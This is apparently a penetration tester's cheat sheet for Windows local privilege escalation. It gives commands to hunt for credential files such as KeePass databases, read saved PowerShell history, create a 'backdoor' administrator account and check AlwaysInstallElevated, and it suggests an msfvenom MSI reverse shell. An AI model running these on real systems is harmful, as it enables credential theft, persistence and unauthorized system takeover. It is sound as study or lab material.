If all else fails, refer to: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation

Search for interesting files
```powershell
#list file structure
tree /f /a

#find filetypes (edit filetypes accordingly)
#cmd
dir /s/b C:\*kdbx
#powershell
Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.pdf,*.kdbx,*.exe -Recurse -ErrorAction SilentlyContinue
```

- Check PowerShell history of a user
```powershell
Get-History
```

- `Clear-History` does not clear the command history recorded by `PSReadline` 
- Use `Get-PSReadlineOption` to obtain information
```powershell
(Get-PSReadlineOption).HistorySavePath
```
- This displays the path of the history file from PSReadline. Use `type` command to view the file content
```powershell
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

# Add new user
```shell
net user /add backdoor Password1
```

# Add new user to Administrators group
```shell
net localgroup administrators /add backdoor
```
These commands useful when using GodPotato for example

# AlwaysInstallElevated
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\SYSTEM

Use `msfvenom` to generate windows reverse shell binary in `.msi` format
